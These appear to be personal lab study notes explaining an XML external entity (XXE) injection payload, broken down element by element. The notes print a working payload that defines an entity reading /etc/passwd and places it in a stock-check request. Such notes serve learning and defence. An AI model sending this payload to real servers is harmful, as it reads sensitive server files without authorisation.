this payload will be inserted:

`<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>![8e0eae6ed1ddd74dc54b4617e5f6c32c.png](file:///home/kenny/.config/joplin-desktop/resources/9c4d91064cd74bb58b7885942b3d862f.png?t=1754491970736)`  
**Understanding payload:**

`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>1&xxe;</productId><storeId>1</storeId></stockCheck>`

#### 1. `<?xml version="1.0"?>`

This is the **XML declaration** â€” it just tells the parser the version of XML being used. Not malicious by itself.

* * *

#### 2. `<!DOCTYPE data [ ... ]>`

This is a **Document Type Definition (DTD)** declaration.

- It allows defining **entities** inside the XML document.
    
- These entities can be reused inside the document body.
    

* * *

#### 3. `<!ENTITY xxe SYSTEM "file:///etc/passwd">`

This is the key malicious line.

- It defines an entity called `xxe`.
    
- It tells the parser: *"Whenever you see `&xxe;`, replace it with the contents of the file `/etc/passwd` on the server."*
    

ðŸ“ `/etc/passwd` is a sensitive file on Linux systems that contains user account information.

> ðŸ’£ This is dangerous because it allows an attacker to read **local files** on the server.

* * *

#### 4. `<data>&xxe;</data>`

This is the **actual content** of the XML body.

- The `&xxe;` gets replaced by the file content (if the parser allows it).
